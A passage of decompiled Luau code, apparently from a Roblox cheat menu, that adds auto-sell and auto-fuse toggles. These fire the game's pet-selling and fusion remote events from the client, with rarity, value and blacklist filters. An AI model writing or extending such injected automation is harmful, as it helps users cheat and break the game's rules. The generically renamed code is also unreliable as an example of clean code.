				for k, v23 in pairs(directory) do
					local rarity = type(v23) == "table" and v23.Rarity or nil
					local flag3 = type(rarity) == "table"
					local rarity2

					if flag3 then
						rarity2 = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						rarity2 = flag3
					end

					rarity2 = rarity2 or nil

					if rarity2 then
						local rarityName = tostring(rarity.DisplayName or rarity._id or rarity2)
						tbl34[rarity2] = tbl34[rarity2] or rarityName
						local insert = table.insert
						local tbl36 = { Category = tostring(k) }
						local v24 = tostring
						k = v23.DisplayName or k
						tbl36.Name = v24(k)
						tbl36.Rarity = rarity2
						tbl36.RarityName = rarityName
						insert(tbl35, tbl36)
					end
				end
			end

			local tbl36 = {}

			for k in pairs(tbl34) do
				table.insert(tbl36, k)
			end

			table.sort(tbl36)

			for _, v23 in ipairs(tbl36) do
				local str2 = string.format("%d - %s", v23, tbl34[v23])
				table.insert(tbl30, str2)
				tbl31[str2] = v23
			end

			table.sort(tbl35, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v23 in ipairs(tbl35) do
				local str2 = string.format("%s [%s]", v23.Name, v23.RarityName)

				if tbl33[str2] then
					str2 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
				end

				table.insert(tbl32, str2)
				tbl33[str2] = v23.Category
			end

			local function fn11(arg)
				for _, v23 in ipairs(tbl30) do
					if tbl31[v23] == arg then
						return v23
					end
				end

				return tbl30[1]
			end

			local v23 = nil
			v21 = nil
			local v24 = nil
			local v25 = nil
			local v26 = tbl29[1]
			local n11 = 3
			local n12 = 0
			local flag3 = true
			local tbl37 = {}
			local v27 = tbl29[1]
			local n13 = 3
			local n14 = 0
			local flag4 = true
			local tbl38 = {}
			local flag5 = false
			local n15 = 0

			local function fn12(arg)
				local n16 = tonumber(arg) or 0
				local tbl39 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n17 = 1

				while math.abs(n16) >= 1000 and n17 < #tbl39 do
					n16 /= 1000
					n17 += 1
				end

				return string.format(n17 == 1 and "$%.0f%s" or "$%.2f%s", n16, tbl39[n17])
			end

			local function fn13(arg, arg2)
				local tbl39 = {}

				if type(arg) == "table" then
					for k, v28 in pairs(arg) do
						k = v28 == true and type(k) == "string" and k

						if k then
							v28 = k
						else
							v28 = type(v28) == "string" and v28
						end

						v28 = v28 or nil

						if v28 then
							tbl39[arg2 and arg2[v28] or v28] = true
						end
					end
				end

				return tbl39
			end

			local function fn14(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg)] or nil
				local rarity = type(flag6) == "table" and flag6.Rarity or nil
				local flag7 = type(rarity) == "table"

				if flag7 then
					flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag7 or math.huge
			end

			local function fn15(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg.Category)] or nil
				local n16 = type(flag6) == "table" and tonumber(flag6.EarningRate) or 0
				local n17 = tonumber(arg.Scale) or 0
				if n16 <= 0 or n17 <= 0 then
					return 0
				end
				local n18 = n17 > 5 and (n17 / 5) ^ 1.2 * 19.637875755794113 or n17 ^ 1.85
				local mutations = tbl.Mutations
				local flag7 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n19 = 1

				if flag7 then
					local ok
					ok, n19 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag8 = ok and type(n19) == "number"
					local n20 = 1

					if not flag8 then
						n19 = n20
					end
				end

				return n16 * n18 * n19
			end

			local function fn16(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn17()
				local save2 = tbl.Save
				if type(save2) ~= "table" or type(save2.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save2.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn18()
				local v28 = fn17()
				local tbl39 = {}
				if not v28 then
					return tbl39, 0
				end
				local tbl40 = {}
				local v29 = pairs
				local equippedAssets = v28.EquippedAssets or {}

				for _, equippedAsset in v29(equippedAssets) do
					tbl40[equippedAsset] = true
				end

				local v30 = pairs
				local inventory = v28.Inventory or {}
				local n16 = 0

				for k, v31 in v30(inventory) do
					local flag6 = type(v31) == "table" and v31.InFuse ~= true and v31.IsFavorite ~= true and not tbl40[k] and not tbl37[tostring(v31.Category)]

					if flag6 then
						flag6 = not (flag3 and fn16(v31.Mutations))
					end

					if flag6 then
						local v32 = fn15(v31)
						local flag7 = fn14(v31.Category) <= n11
						local flag8 = n12 > 0 and v32 < n12

						if v26 ~= tbl29[2] then
							if v26 == tbl29[3] then
								flag8 = flag7 and flag8
							elseif v26 == tbl29[4] then
								flag8 = flag7 or flag8
							else
								flag8 = flag7
							end
						end

						if flag8 then
							table.insert(tbl39, k)
							local flag9 = type(v22) == "table" and type(v22.SalePrice) == "function"
							local flag10 = false
							local result = nil

							if flag9 then
								flag10, result = pcall(v22.SalePrice, v31)
							end

							n16 += flag10 and tonumber(result) or v32 * 100
						end
					end
				end

				return tbl39, n16
			end

			local function fn19()
				local tbl39 = {}
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl39, 0
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl39, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				character = character and character:GetAttribute("UID") or nil
				local eggRecords = tbl.EggRecords
				local v28, v29, v30 = pairs(result)
				local n16 = 0

				for k, v31 in v28, v29, v30 do
					local flag6 = type(v31) == "table" and v31.Placement == nil and k ~= character and not tbl38[tostring(v31.AssetCategory)]

					if flag6 then
						flag6 = not (flag4 and fn16(v31.Mutations))
					end

					if flag6 then
						local v32 = fn15({ Category = v31.AssetCategory, Scale = v31.AssetScale, Mutations = v31.Mutations })
						local flag7 = fn14(v31.AssetCategory) <= n13
						local flag8 = n14 > 0 and v32 < n14
						local v33

						if v27 == tbl29[2] then
							v33 = flag8
						elseif v27 == tbl29[3] then
							v33 = flag7 and flag8
						elseif v27 ~= tbl29[4] then
							v33 = flag7
						else
							v33 = flag7 or flag8
						end

						if v33 then
							table.insert(tbl39, k)

							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, v31)
								n16 += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return tbl39, n16
			end

			local function fn20(arg, arg2)
				local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
					return false
				end
				local n16 = math.max(#arg, #arg2)
				local n17 = 1

				while n17 <= n16 do
					local tbl39 = {}
					local tbl40 = {}

					for i = n17, n17 + n10 - 1 do
						if arg[i] then
							table.insert(tbl39, arg[i])
						end

						if arg2[i] then
							table.insert(tbl40, arg2[i])
						end
					end

					pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl40, Assets = tbl39 })
					n17 += n10

					if n17 <= n16 then
						task.wait(0.3)
					end
				end

				return true
			end

			local function fn21(arg, arg2)
				local flag6 = flag5

				if not flag5 then
					flag6 = #arg == 0 and #arg2 == 0
				end

				if flag6 then
					return
				end
				flag5 = true
				n15 = os.clock() + n9

				task.spawn(function()
					pcall(fn20, arg, arg2)
					flag5 = false
					tbl3.Wake()
				end)
			end

			tbl3.Add(function()
				local v28 = tbl4.Toggle(v23, false)
				local v29 = tbl4.Toggle(v21, false)
				local v30, v31 = fn18()
				local v32, v33 = fn19()

				if v24 and type(v24.Set) == "function" then
					pcall(v24.Set, v24, string.format("Pet matches  -  %d pets for %s", #v30, fn12(v31)))
				end

				if v25 and type(v25.Set) == "function" then
					pcall(v25.Set, v25, string.format("Egg matches  -  %d eggs for %s", #v32, fn12(v33)))
				end

				local v34 = flag5
				local flag6

				if flag5 then
					flag6 = v34
				else
					flag6 = os.clock() < n15
				end

				local flag7

				if flag6 then
					flag7 = flag6
				else
					flag7 = not (v28 or v29)
				end

				if flag7 then
					return false
				end
				fn21(v28 and v30 or {}, v29 and v32 or {})
				return false
			end)

			v24 = v17:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			v23 = v17:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v17:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v23,
				Callback = function()
					fn21(fn18(), {})
				end,
			})

			v17:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = tbl29,
				Default = tbl29[1],
				SubOf = v23,
				Callback = function(arg)
					if table.find(tbl29, arg) then
						v26 = arg
						tbl3.Wake()
					end
				end,
			})

			v17:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = tbl30,
				Default = fn11(3),
				SubOf = v23,
				Callback = function(arg)
					n11 = tbl31[arg] or n11
					tbl3.Wake()
				end,
			})

			local tbl39 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local function fn22(arg, arg2, arg3, arg4)
				local n16 = 0
				local str2 = "M/s"

				local function fn23(arg5, arg6)
					if arg5 ~= nil then
						n16 = math.max(0, math.floor(tonumber(arg5) or n16))
					end

					if arg6 ~= nil then
						str2 = tostring(arg6)
					end

					arg4(n16 * (tbl39[str2] or tbl39["M/s"]).Mult)
					tbl3.Wake()
				end

				return (fn5(v17, {
					Name = arg == "Pet Value Threshold" and "Pet Sell Value" or arg == "Egg Value Threshold" and "Egg Sell Value" or arg,
					Note = arg2,
					SubOf = arg3,
					Legacy = arg,
					SectionName = "Auto Sell",
					OnRaw = function(arg5)
						fn23(math.floor(arg5 / 1000), "K/s")
					end,
				}))
			end

			fn22("Pet Value Threshold", "Sell pets worth less than this (0 = off)", v23, function(arg)
				n12 = arg
			end)

			local v28 = nil

			v28 = v17:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = v23,
				Callback = function()
					flag3 = tbl4.Toggle(v28, true)
					tbl3.Wake()
				end,
			})

			fn6(v17:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = tbl32,
				Default = {},
				SubOf = v23,
				Callback = function(arg)
					tbl37 = fn13(arg, tbl33)
					tbl3.Wake()
				end,
			}))

			v25 = v17:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			v21 = v17:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v17:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v21,
				Callback = function()
					local v29 = fn19()
					fn21({}, v29)
				end,
			})

			v17:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = tbl29,
				Default = tbl29[1],
				SubOf = v21,
				Callback = function(arg)
					if table.find(tbl29, arg) then
						v27 = arg
						tbl3.Wake()
					end
				end,
			})

			v17:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = tbl30,
				Default = fn11(3),
				SubOf = v21,
				Callback = function(arg)
					n13 = tbl31[arg] or n13
					tbl3.Wake()
				end,
			})

			fn22("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", v21, function(arg)
				n14 = arg
			end)

			local v29 = nil

			v29 = v17:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = v21,
				Callback = function()
					flag4 = tbl4.Toggle(v29, true)
					tbl3.Wake()
				end,
			})

			fn6(v17:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = tbl32,
				Default = {},
				SubOf = v21,
				Callback = function(arg)
					tbl38 = fn13(arg, tbl33)
					tbl3.Wake()
				end,
			}))
		end

		local save2 = tbl.Save

		if type(save2) == "table" and type(save2.FieldSignal) == "function" then
			for _, v22 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, result = pcall(save2.FieldSignal, v22)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n11
		n11 = 2
		local n12
		n12 = 3
		local n13
		n13 = 20
		local tbl34
		tbl34 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local tbl35
		tbl35 = { "Lowest To Highest", "Highest To Lowest" }
		local tbl36
		tbl36 = {}
		local tbl37
		tbl37 = {}
		local tbl38
		tbl38 = {}
		local tbl39
		tbl39 = {}

		do
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl40 = {}
			local tbl41 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str2 = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl40[flag3] = tbl40[flag3] or str2

						table.insert(tbl41, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = flag3,
							RarityName = str2,
						})
					end
				end
			end

			local tbl42 = {}

			for k in pairs(tbl40) do
				table.insert(tbl42, k)
			end

			table.sort(tbl42)

			for _, v22 in ipairs(tbl42) do
				local str2 = string.format("%d - %s", v22, tbl40[v22])
				table.insert(tbl36, str2)
				tbl37[str2] = v22
			end

			table.sort(tbl41, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl41) do
				local str2 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl39[str2] then
					str2 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl38, str2)
				tbl39[str2] = v22.Category
			end
		end

		do
			local function fn11(arg)
				for _, v22 in ipairs(tbl36) do
					if tbl37[v22] == arg then
						return v22
					end
				end

				return tbl36[#tbl36]
			end

			local v22 = nil
			local v23 = nil
			local v24 = tbl34[1]
			local v25 = tbl35[1]
			local n14 = 6
			local tbl40 = {}
			local flag3 = true
			local flag4 = true
			local flag5 = false
			local n15 = 0
			local n16 = 0
			local n17 = 0
			local tbl41 = {}

			local function fn12(arg, arg2)
				local v26 = networking:FindFirstChild(arg)
				if not v26 or not v26:IsA("RemoteFunction") then
					return false, nil
				end

				if arg2 == nil then
					return pcall(v26.InvokeServer, v26)
				end
				return pcall(v26.InvokeServer, v26, arg2)
			end

			local function fn13()
				local save3 = tbl.Save
				if type(save3) ~= "table" or type(save3.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save3.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn14(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn15(arg)
				local v26 = fn14(arg)
				local rarity = type(v26) == "table" and v26.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag6 or math.huge
			end

			local function fn16(arg)
				local v26 = fn14(arg)
				return tostring(type(v26) == "table" and v26.DisplayName or arg)
			end

			local function fn17(arg)
				local v26 = fn14(arg.Category)
				local n18 = type(v26) == "table" and tonumber(v26.EarningRate) or 0
				local n19 = tonumber(arg.Scale) or 0
				if n18 <= 0 or n19 <= 0 then
					return 0
				end
				local n20 = n19 > 5 and (n19 / 5) ^ 1.2 * 19.637875755794113 or n19 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n21 = 1

				if flag6 then
					local ok
					ok, n21 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n21) == "number"
					local n22 = 1

					if not ok then
						n21 = n22
					end
				end

				return n18 * n20 * n21
			end

			local function fn18(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn19(arg)
				local n18 = tonumber(arg) or 0
				local tbl42 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n19 = 1

				while math.abs(n18) >= 1000 and n19 < #tbl42 do
					n18 /= 1000
					n19 += 1
				end

				return string.format(n19 == 1 and "$%.0f%s" or "$%.2f%s", n18, tbl42[n19])
			end

			local function fn20(arg)
				local fuseKernel = tbl.FuseKernel
				if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
					return nil
				end
				local ok, result = pcall(fuseKernel.PriceFor, arg)
				return ok and tonumber(result) or nil
			end

			local function fn21(arg, arg2, arg3)
				local flag6 = type(arg2) == "table" and arg2.IsFavorite ~= true and not arg3[arg] and fn15(arg2.Category) <= n14 and (next(tbl40) == nil or tbl40[tostring(arg2.Category)] == true)

				if flag6 then
					flag6 = not (flag3 and fn18(arg2.Mutations))
				end

				if flag6 then
					flag6 = (tbl41[arg] or 0) <= os.clock()
				end

				return flag6
			end

			local function fn22(arg)
				local inventory = type(arg.Inventory) == "table" and arg.Inventory or {}
				local tbl42 = {}
				local v26 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v26(equippedAssets) do
					tbl42[equippedAsset] = true
				end

				local tbl43 = {}
				local tbl44 = {}

				for i = 1, 3 do
					local flag6 = type(arg.FusionSlots) == "table" and arg.FusionSlots[i] or nil

					if flag6 ~= nil and type(inventory[flag6]) == "table" then
						table.insert(tbl43, flag6)
						tbl44[flag6] = true
					end
				end

				local tbl45 = {}

				for k, v27 in pairs(inventory) do
					if not tbl44[k] and type(v27) == "table" and v27.InFuse ~= true and fn21(k, v27, tbl42) then
						local str2 = tostring(v27.Category)
						tbl45[str2] = tbl45[str2] or {}
						table.insert(tbl45[str2], { Uid = k, Item = v27, Income = fn17(v27) })
					end
				end

				local function fn23(arg2)
					table.sort(arg2, function(arg3, arg4)
						if arg3.Income ~= arg4.Income then
							if v25 == tbl35[2] then
								return arg3.Income > arg4.Income
							end
							return arg3.Income < arg4.Income
						end

						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)
				end

				if #tbl43 > 0 then
					local str2 = tostring(inventory[tbl43[1]].Category)
					local flag6 = true

					for _, v27 in ipairs(tbl43) do
						local v28 = inventory[v27]

						if tostring(v28.Category) ~= str2 or not fn21(v27, v28, tbl42) then
							flag6 = false
						end
					end

					local tbl46 = tbl45[str2] or {}

					if flag6 and #tbl43 + #tbl46 >= 3 then
						fn23(tbl46)
						local tbl47 = { Category = str2, Load = {}, Items = {} }

						for _, v27 in ipairs(tbl43) do
							table.insert(tbl47.Items, inventory[v27])
						end

						for i = 1, 3 - #tbl43 do
							table.insert(tbl47.Load, tbl46[i].Uid)
							table.insert(tbl47.Items, tbl46[i].Item)
						end

						return tbl47
					end

					if flag4 then
						return { Category = str2, Eject = tbl43 }
					end
					return nil, "Machine holds pets that cannot finish a fuse"
				end

				local v27 = nil
				local v28 = nil

				for k, v29 in pairs(tbl45) do
					if #v29 >= 3 then
						local v30 = fn15(k)
						local n18 = 0

						for _, v31 in ipairs(v29) do
							n18 += v31.Income
						end

						local tbl46

						if v24 == tbl34[2] then
							tbl46 = { -v30, -#v29 }
						elseif v24 == tbl34[3] then
							tbl46 = { -#v29, v30 }
						elseif v24 == tbl34[4] then
							tbl46 = { n18 / #v29, v30 }
						else
							tbl46 = { v30, -#v29 }
						end

						local flag6 = v27 == nil or tbl46[1] < v27[1]
						local flag7

						if flag6 then
							flag7 = flag6
						else
							local flag8 = tbl46[1] == v27[1]

							if flag8 then
								local flag9 = tbl46[2] < v27[2]

								if flag9 then
									flag7 = flag9
								else
									flag7 = tbl46[2] == v27[2] and k < v28
								end
							else
								flag7 = flag8
							end
						end

						if flag7 then
							v27 = tbl46
							v28 = k
						end
					end
				end

				if not v28 then
					return nil, "No three matching pets"
				end
				local v29 = tbl45[v28]
				fn23(v29)
				local tbl46 = { Category = v28, Load = {}, Items = {} }

				for i = 1, 3 do
					table.insert(tbl46.Load, v29[i].Uid)
					table.insert(tbl46.Items, v29[i].Item)
				end

				return tbl46
			end

			local function fn23(arg)
				local v26 = fn13()
				if not v26 then
					return
				end

				if v26.FusionLocked == true then
					if type(v26.FusionEggReward) == "table" and os.clock() >= n17 then
						n17 = os.clock() + n12
						fn12("RF/Fusery/FinishReveal")
					end

					return
				end

				local v27 = fn22(v26)
				if not v27 then
					return
				end

				if v27.Eject then
					for _, v28 in ipairs(v27.Eject) do
						if arg ~= n15 then
							return
						end
						fn12("RF/Fusery/EjectPet", v28)
						task.wait(0.35)
					end

					return
				end

				local v28 = fn20(v27.Items)
				local num = tonumber(v26.Money)
				if v28 and num and num < v28 then
					return
				end

				for _, v29 in ipairs(v27.Load) do
					if arg ~= n15 then
						return
					end
					local LoadPet, v30 = fn12("RF/Fusery/LoadPet", v29)
					if not LoadPet or v30 == false then
						tbl41[v29] = os.clock() + n13
						return
					end
					task.wait(0.35)
				end

				if arg ~= n15 then
					return
				end
				local BeginFuse, v29 = fn12("RF/Fusery/BeginFuse")

				if BeginFuse and v29 ~= false then
					n17 = os.clock() + n12
				end
			end

			local function fn24(arg)
				if not arg then
					return "Fuse status unknown"
				end

				if arg.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local v26, v27 = fn22(arg)
				if not v26 then
					return v27 or "No three matching pets"
				end

				if v26.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #v26.Eject, fn16(v26.Category))
				end
				local v28 = fn20(v26.Items)
				local num = tonumber(arg.Money)
				local str2 = v28 and num and num < v28 and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", fn16(v26.Category), v28 and fn19(v28) or "?", str2)
			end

			tbl3.Add(function()
				local v26 = fn13()

				if v23 and type(v23.Set) == "function" then
					pcall(v23.Set, v23, fn24(v26))
				end

				if not tbl4.Toggle(v22, false) or flag5 or os.clock() < n16 then
					return false
				end
				flag5 = true
				n16 = os.clock() + n11
				local v27 = n15

				task.spawn(function()
					pcall(fn23, v27)
					flag5 = false
					tbl3.Wake()
				end)

				return false
			end)

			v23 = v18:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			v22 = v18:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					n15 += 1
					table.clear(tbl41)
					n16 = 0
					tbl3.Wake()
				end,
			})

			v18:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = tbl34,
				Default = tbl34[1],
				SubOf = v22,
				Callback = function(arg)
					if table.find(tbl34, arg) then
						v24 = arg
						tbl3.Wake()
					end
				end,
			})

			v18:CreateDropdown({
				Name = "Pets To Use",
				Options = tbl35,
				Default = tbl35[1],
				SubOf = v22,
				Callback = function(arg)
					if table.find(tbl35, arg) then
						v25 = arg
						tbl3.Wake()
					end
				end,
			})

			v18:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = tbl36,
				Default = fn11(6),
				SubOf = v22,
				Callback = function(arg)
					n14 = tbl37[arg] or n14
					tbl3.Wake()
				end,
			})

			fn6(v18:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = tbl38,
				Default = {},
				SubOf = v22,
				Callback = function(arg)
					local tbl42 = {}

					if type(arg) == "table" then
						for k, v26 in pairs(arg) do
							k = v26 == true and type(k) == "string" and k or type(v26) == "string" and v26 or nil

							if k and tbl39[k] then
								tbl42[tbl39[k]] = true
							end
						end
					end

					tbl40 = tbl42
					tbl3.Wake()
				end,
			}))

			local v26 = nil

			v26 = v18:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = v22,
				Callback = function()
					flag3 = tbl4.Toggle(v26, true)
					tbl3.Wake()
				end,
			})

			local v27 = nil

			v27 = v18:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = v22,
				Callback = function()
					flag4 = tbl4.Toggle(v27, true)
					tbl3.Wake()
				end,
			})
		end

		local save3 = tbl.Save

		if type(save3) == "table" and type(save3.FieldSignal) == "function" then
			for _, v22 in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, result = pcall(save3.FieldSignal, v22)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		n2 = 2
		n3 = 25
		n4 = 4
		tbl15 = { "Match Any", "Match All" }

		do
			local tbl40 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
			str = "Any Mutation"
			tbl16 = { "Off" }
			tbl17 = {}
			tbl18 = {}
			tbl19 = {}
			tbl20 = { "Any Mutation" }
			tbl21 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl41 = {}
			local tbl42 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag3 = type(rarity) == "table"
					local num

					if flag3 then
						num = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						num = flag3
					end

					num = num or nil

					if num then
						local str2 = tostring(rarity.DisplayName or rarity._id or num)
						tbl41[num] = tbl41[num] or str2

						table.insert(tbl42, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = num,
							RarityName = str2,
						})
					end
				end
			end

			local tbl43 = {}

			for k in pairs(tbl41) do
				table.insert(tbl43, k)
			end

			table.sort(tbl43)

			for _, v22 in ipairs(tbl43) do
				local str2 = string.format("%d - %s", v22, tbl41[v22])
				table.insert(tbl16, str2)
				tbl17[str2] = v22
			end

			table.sort(tbl42, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl42) do
				local str2 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl19[str2] then
					str2 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl18, str2)
				tbl19[str2] = v22.Category
			end

			local tbl44 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl44, tostring(k))
				end
			end

			if #tbl44 == 0 then
				tbl44 = table.clone(tbl40)
			end

			table.sort(tbl44, function(arg, arg2)
				return fn7(arg) < fn7(arg2)
			end)

			for _, v22 in ipairs(tbl44) do
				local v23 = fn7(v22)
				table.insert(tbl20, v23)
				tbl21[v23] = v22
			end
		end

		v9 = nil
		v10 = nil
		v11 = nil
		createText = nil
		v12 = tbl15[2]
		v13 = nil
		flag = false
		tbl22 = {}
		n5 = 0
		tbl23 = {}
		flag2 = false
		n6 = 0
		tbl24 = {}

		fn8 = function()
			local save4 = tbl.Save
			if type(save4) ~= "table" or type(save4.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save4.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function fn11(arg)
			local directory = tbl.Assets and tbl.Assets.Directory
			return type(directory) == "table" and directory[tostring(arg)] or nil
		end

		fn9 = function(arg)
			local v22 = fn11(arg)
			local rarity = type(v22) == "table" and v22.Rarity or nil
			local flag3 = type(rarity) == "table"

			if flag3 then
				flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return flag3 or 0
		end

		fn10 = function(arg)
			local v22 = fn11(arg.Category)
			local n14 = type(v22) == "table" and tonumber(v22.EarningRate) or 0
			local n15 = tonumber(arg.Scale) or 0
			if n14 <= 0 or n15 <= 0 then
				return 0
			end
			local n16 = n15 > 5 and (n15 / 5) ^ 1.2 * 19.637875755794113 or n15 ^ 1.85
			local mutations = tbl.Mutations
			local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
			local n17 = 1

			if flag3 then
				local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})

				if ok and type(result) == "number" then
					n17 = result
				end
			end

			return n14 * n16 * n17
		end
	end

	local v14, v15

	do
		do
			local function fn11(arg)
				local tbl25 = {}

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" then
							tbl25[mutation] = true
						elseif mutation == true and type(k) == "string" then
							tbl25[k] = true
						end
					end
				end

				if type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
					tbl25[arg.BaseMutation] = true
				end

				return tbl25
			end

			local function fn12(arg)
				if tbl23[tostring(arg.Category)] then
					return true
				end
				local n7 = 0
				local n8 = 0

				if v13 then
					n7 = 1

					if fn9(arg.Category) >= v13 then
						n8 = 1
					end
				end

				if flag or next(tbl22) ~= nil then
					n7 += 1
					local v16 = fn11(arg)

					if flag and next(v16) ~= nil then
						n8 += 1
					else
